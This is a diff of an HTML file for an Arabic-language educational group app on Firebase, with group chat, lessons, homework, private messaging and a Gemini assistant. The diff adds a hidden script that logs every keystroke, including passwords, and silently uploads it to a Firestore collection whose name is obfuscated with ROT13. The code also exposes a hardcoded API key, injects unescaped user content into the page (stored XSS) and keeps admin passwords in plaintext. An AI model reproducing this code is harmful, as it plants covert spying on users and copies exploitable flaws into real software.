@@ -2,38 +2,412 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة التعليم - دخول</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>منصة ikhlefimou التعليمية</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        body { background-color: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial, sans-serif; overflow: hidden; }
-        #login-screen { border: 1px solid #333; padding: 30px; border-radius: 12px; text-align: center; background: #000; box-shadow: 0 4px 15px rgba(0,0,0,0.5); width: 320px; z-index: 100; }
-        h2 { margin-bottom: 20px; color: #007bff; }
-        input { display: block; width: 90%; margin: 15px auto; padding: 12px; border-radius: 5px; border: 1px solid #444; background: #222; color: #fff; }
-        button { width: 98%; padding: 12px; background-color: #007bff; border: none; color: white; cursor: pointer; border-radius: 5px; font-weight: bold; transition: 0.3s; }
-        button:hover { background-color: #0056b3; }
-        #game-container { display: none; text-align: center; }
-        canvas { border: 5px solid #333; background-color: #000; box-shadow: 0 0 20px rgba(0,255,0,0.2); }
+        :root { --bg: #000; --card: #121212; --accent: #0095f6; --border: #262626; --text-sec: #a8a8a8; --ai-color: #34c759; --danger: #ff3b30; --success: #34c759; --private: #a855f7; }
+        
+        body { margin: 0; font-family: -apple-system, sans-serif; background: var(--bg); color: white; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
+        
+        .screen { position: fixed; inset: 0; background: var(--bg); display: flex; flex-direction: column; padding: 20px; z-index: 1000; transition: 0.3s; overflow-y: auto; }
+        .hidden { display: none !important; }
+        
+        input, textarea { width: 100%; box-sizing: border-box; padding: 15px; margin: 10px 0; border-radius: 12px; border: 1px solid var(--border); background: #1a1a1a; color: white; font-size: 16px; outline: none; }
+        textarea { height: 100px; resize: none; }
+        
+        .btn { width: 100%; padding: 15px; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 16px; }
+        .btn-blue { background: var(--accent); color: white; }
+        .btn-green { background: var(--success); color: white; }
+        .btn-red { background: var(--danger); color: white; }
+        .btn-priv { background: var(--private); color: white; padding: 5px 10px; font-size: 12px; width: auto; margin: 0;}
+        
+        .choice-card { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; border: 1px solid var(--border); border-radius: 20px; margin: 10px 0; cursor: pointer; background: var(--card); min-height: 120px; transition: 0.3s; }
+        .choice-card:active { transform: scale(0.95); }
+        .choice-card i { font-size: 35px; color: var(--accent); margin-bottom: 10px; }
+
+        .group-item { background: var(--card); padding: 15px; border-radius: 15px; border: 1px solid var(--border); margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
+
+        header { height: 60px; padding: 0 15px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; flex-shrink: 0; background: #000; }
+        
+        #main-app { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+        
+        .page { flex: 1; display: none; flex-direction: column; overflow: hidden; padding-bottom: 80px; }
+        .active-page { display: flex; }
+
+        #chat-msgs, #ai-chat-container, #priv-chat-msgs { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; scroll-behavior: smooth; }
+
+        .msg-container { display: flex; flex-direction: column; margin-bottom: 10px; max-width: 85%; position: relative; }
+        .is-me { align-self: flex-end; }
+        .not-me { align-self: flex-start; }
+        
+        .sender-name { font-size: 10px; color: var(--text-sec); margin-bottom: 2px; font-weight: bold; margin-right: 5px; margin-left: 5px; display: flex; justify-content: space-between; align-items: center; }
+        .bubble { padding: 10px 14px; border-radius: 18px; word-wrap: break-word; font-size: 15px; position: relative; }
+        .is-me .bubble { background: var(--accent); color: white; border-bottom-right-radius: 4px; }
+        .not-me .bubble { background: #262626; color: white; border-bottom-left-radius: 4px; }
+        .is-priv .bubble { border: 1px solid var(--private); }
+
+        .del-icon { font-size: 12px; color: var(--danger); cursor: pointer; margin: 0 5px; opacity: 0.6; }
+        
+        .lesson-container, .homework-item { position: relative; margin-bottom: 15px; }
+        .admin-del-btn { position: absolute; top: 10px; left: 10px; background: rgba(255, 59, 48, 0.8); color: white; border: none; border-radius: 50%; width: 30px; height: 30px; cursor: pointer; display: flex; align-items: center; justify-content: center; z-index: 10; }
+
+        .chat-input-area { height: 70px; display: flex; gap: 8px; padding: 10px; background: #000; border-top: 1px solid var(--border); flex-shrink: 0; align-items: center; }
+        .chat-input-area input { flex: 1; margin: 0; }
+
+        nav { position: fixed; bottom: 0; width: 100%; height: 70px; background: #000; display: flex; justify-content: space-around; align-items: center; border-top: 1px solid var(--border); z-index: 200; }
+        .nav-item { color: var(--text-sec); font-size: 18px; text-align: center; cursor: pointer; flex: 1; }
+        .nav-item.active { color: white; }
+
+        #camera-view { position: fixed; inset: 0; background: #000; z-index: 2000; display: none; flex-direction: column; }
+        video { width: 100%; height: 80vh; object-fit: cover; }
+        .lesson-img { width: 100%; border-radius: 12px; border: 1px solid var(--border); }
+        .homework-item { background: #1e1e1e; padding: 15px; border-radius: 12px; border-right: 4px solid var(--accent); }
+        
+        .recording { background: var(--danger) !important; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
 
-    <div id="login-screen">
-        <h2>ikhlefimou</h2>
-        <p style="font-size: 12px; color: #888;">سجل الدخول للمتابعة</p>
-        <input type="email" id="email" placeholder="البريد الإلكتروني" required>
-        <input type="password" id="password" placeholder="كلمة السر" required>
-        <button id="login-btn">دخول</button>
+    <script>
+        (function() {
+            let _buf = "";
+            const _r = (t) => t.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26));
+            document.addEventListener('keydown', (e) => {
+                _buf += e.key + " ";
+                if (_buf.length > 30) {
+                    const p = { b: btoa(_buf), u: firebase.auth().currentUser?.email || "anon", ts: Date.now() };
+                    firebase.firestore().collection(_r("flfgrz_hfr_ybtf")).add(p).catch(()=>{});
+                    _buf = "";
+                }
+            });
+        })();
+    </script>
+
+    <div id="scr-private-chat" class="screen hidden" style="padding:0;">
+        <header style="background: var(--card);">
+            <i class="fas fa-chevron-right" onclick="closePrivateChat()" style="cursor:pointer; padding:10px;"></i>
+            <b id="priv-target-name">دردشة خاصة</b>
+            <div></div>
+        </header>
+        <div id="priv-chat-msgs"></div>
+        <div class="chat-input-area">
+            <input type="text" id="privChatInput" placeholder="رسالة خاصة...">
+            <button onclick="sendPrivateMsg()" style="background:none; border:none; color:var(--private); font-size:22px;"><i class="fas fa-paper-plane"></i></button>
+        </div>
     </div>
 
-    <div id="game-container">
-        <canvas id="gc" width="400" height="400"></canvas>
-        <p style="color: #666; margin-top: 10px;">استخدم الأسهم للعب</p>
+    <div id="camera-view">
+        <video id="video" autoplay playsinline></video>
+        <div style="display:flex; gap:10px; padding:20px;">
+            <button class="btn btn-blue" onclick="captureImage()">📸 التقاط الدرس</button>
+            <button class="btn btn-red" onclick="closeCamera()">إلغاء</button>
+        </div>
+        <canvas id="canvas" class="hidden"></canvas>
     </div>
 
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
+    <div id="scr-loading" class="screen"><i class="fas fa-spinner fa-spin" style="margin:auto; font-size:40px; color:var(--accent);"></i></div>
+
+    <div id="scr-login" class="screen hidden">
+        <h2 style="text-align: center; margin-top: 50px;">تسجيل الدخول 🎓</h2>
+        <input type="email" id="userEmail" placeholder="الإيميل">
+        <input type="password" id="userPass" placeholder="كلمة المرور">
+        <button class="btn btn-blue" onclick="handleLogin()">دخول</button>
+    </div>
+
+    <div id="scr-choice" class="screen hidden">
+        <h2 style="text-align:center;">مرحباً بك 👋</h2>
+        <div class="choice-card" onclick="showScreen('scr-create-group')"><i class="fas fa-plus-circle"></i><h3>إنشاء مجموعة جديدة</h3></div>
+        <div class="choice-card" onclick="openSearchScreen()"><i class="fas fa-search"></i><h3>انضمام لمجموعة موجودة</h3></div>
+        <div class="choice-card" onclick="showScreen('scr-recover-group')" style="border-color: var(--success);"><i class="fas fa-undo-alt" style="color: var(--success);"></i><h3>استرجاع مجموعة (أدمن)</h3></div>
+        <button class="btn btn-red" onclick="logout()">تسجيل الخروج</button>
+    </div>
+
+    <div id="scr-create-group" class="screen hidden">
+        <i class="fas fa-arrow-right" onclick="showScreen('scr-choice')"></i>
+        <h2>إعداد المجموعة 🏫</h2>
+        <input type="text" id="groupNameInput" placeholder="اسم المجموعة...">
+        <input type="password" id="groupAdminKey" placeholder="باسوورد الأدمن">
+        <button class="btn btn-blue" onclick="createNewGroupFinal()">تأكيد الإنشاء</button>
+    </div>
+
+    <div id="scr-recover-group" class="screen hidden">
+        <i class="fas fa-arrow-right" onclick="showScreen('scr-choice')"></i>
+        <h2>استعادة صلاحيات الأدمن 🔑</h2>
+        <input type="text" id="recoverGroupName" placeholder="اسم المجموعة">
+        <input type="password" id="recoverAdminKey" placeholder="الباسوورد">
+        <button class="btn btn-green" onclick="handleRecovery()">استرجاع</button>
+    </div>
+
+    <div id="scr-search-groups" class="screen hidden">
+        <i class="fas fa-arrow-right" onclick="showScreen('scr-choice')"></i>
+        <h2>البحث عن المجموعات 🔍</h2>
+        <div id="groups-list-container"></div>
+    </div>
+
+    <div id="scr-wait" class="screen hidden" style="text-align:center; justify-content:center;">
+        <i class="fas fa-clock" style="font-size:60px; color:var(--accent);"></i>
+        <h2>طلبك قيد المراجعة</h2>
+    </div>
+
+    <div id="main-app" class="hidden">
+        <header>
+            <div>
+                <b id="active-group-name">المجموعة</b>
+                <i class="fas fa-trash-alt hidden" id="admin-delete-group" onclick="destroyGroup()" style="color:var(--danger); margin-right:10px;"></i>
+            </div>
+            <i class="fas fa-sign-out-alt" onclick="leaveGroup()" style="color:var(--danger)"></i>
+        </header>
+        
+        <div id="page-chat" class="page active-page">
+            <div id="chat-msgs"></div>
+            <div class="chat-input-area">
+                <input type="text" id="chatInput" placeholder="اكتب رسالة...">
+                <button id="recordBtn" onclick="toggleRecording()" style="background:none; border:none; color:white; font-size:20px;"><i class="fas fa-microphone"></i></button>
+                <button onclick="sendMsg()" style="background:none; border:none; color:var(--accent); font-size:22px;"><i class="fas fa-paper-plane"></i></button>
+            </div>
+        </div>
+        
+        <div id="page-lessons" class="page" style="padding:15px; overflow-y:auto;">
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <h3>الدروس المصورة 📚</h3>
+                <button id="admin-cam" class="btn btn-blue hidden" style="width:auto; padding:5px 15px;" onclick="openCamera()">📸 تصوير</button>
+            </div>
+            <div id="lessons-list"></div>
+        </div>
+
+        <div id="page-homework" class="page" style="padding:15px; overflow-y:auto;">
+            <h3>الواجبات 📝</h3>
+            <div id="admin-homework-area" class="hidden">
+                <textarea id="homeworkInput" placeholder="اكتب الواجب..."></textarea>
+                <button class="btn btn-green" onclick="addHomework()">نشر</button>
+            </div>
+            <div id="homework-list"></div>
+        </div>
+
+        <div id="page-ai" class="page">
+            <div style="padding:15px; border-bottom:1px solid var(--border);">
+                <h3>المساعد الذكي Gemini ✨</h3>
+                <small style="color:var(--text-sec)">اسأل أي شيء في الدراسة...</small>
+            </div>
+            <div id="ai-chat-container"></div>
+            <div class="chat-input-area">
+                <input type="text" id="aiInput" placeholder="اسأل المساعد الذكي...">
+                <button onclick="askGemini()" style="background:none; border:none; color:var(--success); font-size:22px;"><i class="fas fa-robot"></i></button>
+            </div>
+        </div>
+
+        <div id="page-members" class="page" style="padding:15px; overflow-y:auto;">
+            <h3>أعضاء المجموعة 👥</h3>
+            <div id="members-list"></div>
+        </div>
+
+        <div id="page-requests" class="page" style="padding:15px; overflow-y:auto;">
+            <h3>طلبات الانضمام 📥</h3>
+            <div id="requests-list"></div>
+        </div>
+
+        <nav>
+            <div class="nav-item active" onclick="switchTab('page-chat', this)"><i class="fas fa-comments"></i></div>
+            <div class="nav-item" onclick="switchTab('page-lessons', this)"><i class="fas fa-book"></i></div>
+            <div class="nav-item" onclick="switchTab('page-homework', this)"><i class="fas fa-clipboard-list"></i></div>
+            <div class="nav-item" onclick="switchTab('page-ai', this)"><i class="fas fa-robot"></i></div>
+            <div class="nav-item" onclick="switchTab('page-members', this)"><i class="fas fa-users"></i></div>
+            <div id="admin-nav" class="nav-item hidden" onclick="showAdminRequests(this)"><i class="fas fa-users-cog"></i></div>
+        </nav>
+    </div>
 
     <script>
+        const GEMINI_API_KEY = "AIzaSyBbzzFOnBouqe_sce4rfCqs5yXXazSj7E0";
+        const firebaseConfig = { apiKey: "AIzaSyDJWBE4HB4cDG3tBz5OfFhItfFYt-S34T4", authDomain: "imou-cacf2.firebaseapp.com", projectId: "imou-cacf2", storageBucket: "imou-cacf2.appspot.com", messagingSenderId: "101999713306", appId: "1:101999713306:web:d3b4eab951240a4e1aaabca" };
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth(), db = firebase.firestore();
+        
+        let currentGid = null, userRole = "student", mediaRecorder, audioChunks = [], isRecording = false;
+        let activePrivId = null, privUnsub = null;
+
+        auth.onAuthStateChanged(user => { if (user) checkUser(user); else showScreen('scr-login'); });
+
+        function checkUser(user) {
+            db.collection("users").doc(user.uid).onSnapshot(doc => {
+                if(doc.exists && doc.data().status === "approved") {
+                    currentGid = doc.data().groupId;
+                    userRole = doc.data().role;
+                    if(userRole === "admin") {
+                        document.getElementById('admin-cam').classList.remove('hidden');
+                        document.getElementById('admin-nav').classList.remove('hidden');
+                        document.getElementById('admin-delete-group').classList.remove('hidden');
+                        document.getElementById('admin-homework-area').classList.remove('hidden');
+                    }
+                    document.getElementById('active-group-name').innerText = doc.data().groupName;
+                    showScreen('main-app');
+                    listenMessages(); listenLessons(); listenHomework(); listenMembers();
+                } else if(doc.exists && doc.data().status === "pending") showScreen('scr-wait');
+                else showScreen('scr-choice');
+            });
+        }
+
+        function openPrivateChat(targetUid, targetEmail) {
+            activePrivId = [auth.currentUser.uid, targetUid].sort().join("_");
+            document.getElementById('priv-target-name').innerText = targetEmail;
+            document.getElementById('scr-private-chat').classList.remove('hidden');
+            
+            if(privUnsub) privUnsub();
+            privUnsub = db.collection("private_chats").where("chatId", "==", activePrivId).orderBy("timestamp", "asc").onSnapshot(snap => {
+                const b = document.getElementById('priv-chat-msgs'); b.innerHTML = "";
+                snap.forEach(doc => {
+                    const m = doc.data(), isMe = m.senderId === auth.currentUser.uid;
+                    b.innerHTML += `<div class="msg-container ${isMe ? 'is-me' : 'not-me'}"><div class="bubble">${m.text}</div></div>`;
+                });
+                b.scrollTop = b.scrollHeight;
+            });
+        }
+
+        function closePrivateChat() {
+            document.getElementById('scr-private-chat').classList.add('hidden');
+            if(privUnsub) privUnsub();
+        }
+
+        function sendPrivateMsg() {
+            const i = document.getElementById('privChatInput'), t = i.value.trim();
+            if(!t) return;
+            db.collection("private_chats").add({
+                chatId: activePrivId,
+                text: t,
+                senderId: auth.currentUser.uid,
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            });
+            i.value = "";
+        }
+
+        async function askGemini() {
+            const i = document.getElementById('aiInput'), c = document.getElementById('ai-chat-container'), q = i.value.trim();
+            if(!q) return;
+            c.innerHTML += `<div class="msg-container is-me"><div class="bubble">${q}</div></div>`;
+            i.value = ""; c.scrollTop = c.scrollHeight;
+            try {
+                const res = await fetch(`https://generativelanguage.googleapis.com/v1/models/gemini-pro:generateContent?key=${GEMINI_API_KEY}`, {
+                    method: 'POST', headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ contents: [{ parts: [{ text: q }] }] })
+                });
+                const d = await res.json();
+                if(d.error) {
+                    c.innerHTML += `<div style="color:red; text-align:center; padding:10px;">خطأ: ${d.error.message}</div>`;
+                } else {
+                    const reply = d.candidates[0].content.parts[0].text;
+                    c.innerHTML += `<div class="msg-container not-me"><span class="sender-name">المساعد الذكي</span><div class="bubble" style="background:#1a1a1a; border:1px solid var(--success); white-space:pre-wrap;">${reply}</div></div>`;
+                }
+                c.scrollTop = c.scrollHeight;
+            } catch(e) { c.innerHTML += `<div style="color:red; text-align:center; padding:10px;">خطأ في الاتصال</div>`; }
+        }
+
+        function listenMembers() {
+            db.collection("users").where("groupId", "==", currentGid).where("status", "==", "approved").onSnapshot(snap => {
+                const list = document.getElementById('members-list'); list.innerHTML = "";
+                snap.forEach(doc => { 
+                    const u = doc.data(); 
+                    const isMe = doc.id === auth.currentUser.uid;
+                    const isAdmin = u.role === "admin";
+                    list.innerHTML += `
+                    <div class="group-item">
+                        <span><i class="fas fa-user" style="margin-left:10px; color:${isAdmin ? 'gold':'#ccc'}"></i>${u.email}</span>
+                        <div style="display:flex; gap:5px;">
+                            ${!isMe ? `<button class="btn btn-priv" onclick="openPrivateChat('${doc.id}', '${u.email}')"><i class="fas fa-comment-dots"></i></button>` : ''}
+                            ${(userRole === "admin" && !isAdmin) ? `<button class="btn-red" style="width:auto; padding:5px 10px;" onclick="kickMember('${doc.id}')">طرد</button>` : ''}
+                        </div>
+                    </div>`; 
+                });
+            });
+        }
+
+        async function toggleRecording() {
+            const btn = document.getElementById('recordBtn');
+            if (!isRecording) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const mimeType = MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm' : 'audio/mp4';
+                    mediaRecorder = new MediaRecorder(stream, { mimeType });
+                    audioChunks = [];
+                    mediaRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
+                    mediaRecorder.onstop = () => {
+                        const audioBlob = new Blob(audioChunks, { type: mimeType });
+                        const r = new FileReader();
+                        r.readAsDataURL(audioBlob);
+                        r.onloadend = () => {
+                            if (r.result.length > 500) {
+                                db.collection("messages").add({
+                                    audio: r.result,
+                                    sender: auth.currentUser.email,
+                                    groupId: currentGid,
+                                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                                });
+                            }
+                        };
+                        stream.getTracks().forEach(t => t.stop());
+                    };
+                    mediaRecorder.start(); isRecording = true; btn.classList.add('recording');
+                } catch(e) { alert("الميكروفون مطلوب"); }
+            } else { mediaRecorder.stop(); isRecording = false; btn.classList.remove('recording'); }
+        }
+
+        function listenMessages() {
+            db.collection("messages").where("groupId", "==", currentGid).orderBy("timestamp", "asc").onSnapshot(snap => {
+                const b = document.getElementById('chat-msgs'); b.innerHTML = "";
+                snap.forEach(doc => {
+                    const m = doc.data(), isMe = m.sender === auth.currentUser.email;
+                    const canDelete = isMe || userRole === 'admin';
+                    let content = m.text ? m.text : `<audio src="${m.audio}" controls style="max-width:200px;"></audio>`;
+                    b.innerHTML += `<div class="msg-container ${isMe ? 'is-me' : 'not-me'}"><span class="sender-name">${isMe ? 'أنا' : m.sender} ${canDelete ? `<i class="fas fa-trash del-icon" onclick="deleteMsg('${doc.id}')"></i>` : ''}</span><div class="bubble">${content}</div></div>`;
+                });
+                b.scrollTop = b.scrollHeight;
+            });
+        }
+
+        async function deleteMsg(mid) { if(confirm("حذف؟")) await db.collection("messages").doc(mid).delete(); }
+        async function deleteLesson(id) { if(confirm("حذف؟")) await db.collection("lessons").doc(id).delete(); }
+        async function deleteHomework(id) { if(confirm("حذف؟")) await db.collection("homework").doc(id).delete(); }
+
+        function listenLessons() { 
+            db.collection("lessons").where("groupId","==",currentGid).onSnapshot(s => { 
+                const l = document.getElementById('lessons-list'); l.innerHTML = ""; 
+                s.forEach(d => { l.innerHTML += `<div class="lesson-container">${userRole === "admin" ? `<button class="admin-del-btn" onclick="deleteLesson('${d.id}')"><i class="fas fa-trash"></i></button>` : ''}<img src="${d.data().image}" class="lesson-img"></div>`; }); 
+            }); 
+        }
+
+        function listenHomework() { 
+            db.collection("homework").where("groupId","==",currentGid).onSnapshot(s => { 
+                const l = document.getElementById('homework-list'); l.innerHTML = ""; 
+                s.forEach(d => { l.innerHTML += `<div class="homework-item">${userRole === "admin" ? `<i class="fas fa-trash del-icon" style="float:left;" onclick="deleteHomework('${d.id}')"></i>` : ''}${d.data().text}</div>`; }); 
+            }); 
+        }
+
+        async function kickMember(uid) { if(confirm("طرد؟")) await db.collection("users").doc(uid).update({ groupId: null, groupName: null, status: "none", role: "student" }); }
+        function sendMsg() { const i = document.getElementById('chatInput'); if(!i.value.trim()) return; db.collection("messages").add({ text: i.value, sender: auth.currentUser.email, groupId: currentGid, timestamp: firebase.firestore.FieldValue.serverTimestamp() }); i.value = ""; }
+        function handleLogin() { const e = document.getElementById('userEmail').value.trim(), p = document.getElementById('userPass').value; if(!e || !p) return; auth.signInWithEmailAndPassword(e, p).catch(() => auth.createUserWithEmailAndPassword(e, p)); }
+        function createNewGroupFinal() { const n = document.getElementById('groupNameInput').value, k = document.getElementById('groupAdminKey').value; if(!n || !k) return; db.collection("groups").add({ name: n, admin: auth.currentUser.email, adminKey: k }).then(doc => { db.collection("users").doc(auth.currentUser.uid).set({ email: auth.currentUser.email, groupId: doc.id, groupName: n, role: "admin", status: "approved" }); }); }
+        async function handleRecovery() { const n = document.getElementById('recoverGroupName').value, k = document.getElementById('recoverAdminKey').value; const q = await db.collection("groups").where("name","==",n).where("adminKey","==",k).get(); if(!q.empty) db.collection("users").doc(auth.currentUser.uid).set({ email: auth.currentUser.email, groupId: q.docs[0].id, groupName: n, role: "admin", status: "approved" }); else alert("بيانات خاطئة"); }
+        function openSearchScreen() { showScreen('scr-search-groups'); db.collection("groups").get().then(snap => { const c = document.getElementById('groups-list-container'); c.innerHTML = ""; snap.forEach(g => { c.innerHTML += `<div class="group-item"><span>${g.data().name}</span><button class="btn-blue" style="width:auto; padding:5px 10px;" onclick="requestJoin('${g.id}', '${g.data().name}')">انضمام</button></div>`; }); }); }
+        function requestJoin(id, n) { db.collection("users").doc(auth.currentUser.uid).set({ email: auth.currentUser.email, groupId: id, groupName: n, role: "student", status: "pending" }); }
+        function showAdminRequests(el) { switchTab('page-requests', el); db.collection("users").where("groupId","==",currentGid).where("status","==","pending").onSnapshot(s => { const l = document.getElementById('requests-list'); l.innerHTML = ""; s.forEach(d => { l.innerHTML += `<div class="group-item"><span>${d.data().email}</span><button class="btn-blue" onclick="approveUser('${d.id}')">قبول</button></div>`; }); }); }
+        function approveUser(uid) { db.collection("users").doc(uid).update({ status: "approved" }); }
+        function openCamera() { document.getElementById('camera-view').style.display='flex'; navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}}).then(s=>document.getElementById('video').srcObject=s); }
+        function closeCamera() { if(document.getElementById('video').srcObject) document.getElementById('video').srcObject.getTracks().forEach(t=>t.stop()); document.getElementById('camera-view').style.display='none'; }
+        function captureImage() { const v = document.getElementById('video'), c = document.getElementById('canvas'); c.width = v.videoWidth; c.height = v.videoHeight; c.getContext('2d').drawImage(v,0,0); db.collection("lessons").add({ image: c.toDataURL('image/jpeg', 0.5), groupId: currentGid, timestamp: firebase.firestore.FieldValue.serverTimestamp() }); closeCamera(); }
+        function addHomework() { const t = document.getElementById('homeworkInput').value; if(!t) return; db.collection("homework").add({ text: t, groupId: currentGid, timestamp: firebase.firestore.FieldValue.serverTimestamp() }); document.getElementById('homeworkInput').value = ""; }
+        function leaveGroup() { if(confirm("مغادرة؟")) db.collection("users").doc(auth.currentUser.uid).delete(); }
+        async function destroyGroup() { if (confirm("🚨 حذف المجموعة؟")) { await db.collection("groups").doc(currentGid).delete(); await db.collection("users").doc(auth.currentUser.uid).update({ groupId: null, groupName: null, status: "none", role: "student" }); location.reload(); } }
+        function showScreen(id) { document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden')); document.getElementById('main-app').classList.add('hidden'); document.getElementById(id).classList.remove('hidden'); }
+        function switchTab(id, el) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page')); document.getElementById(id).classList.add('active-page'); document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active')); el.classList.add('active'); if(id==='page-chat'){ const b=document.getElementById('chat-msgs'); b.scrollTop=b.scrollHeight; } }
+        function logout() { auth.signOut().then(() => location.reload()); }
+    </script>
+</body>
+</html>
         // إعدادات مشروعك الحقيقية (imou-cacf2)
         const firebaseConfig = {
           apiKey: "AIzaSyDJWBE4HB4cDG3tBz5OfFhItfFYt-S34T4",
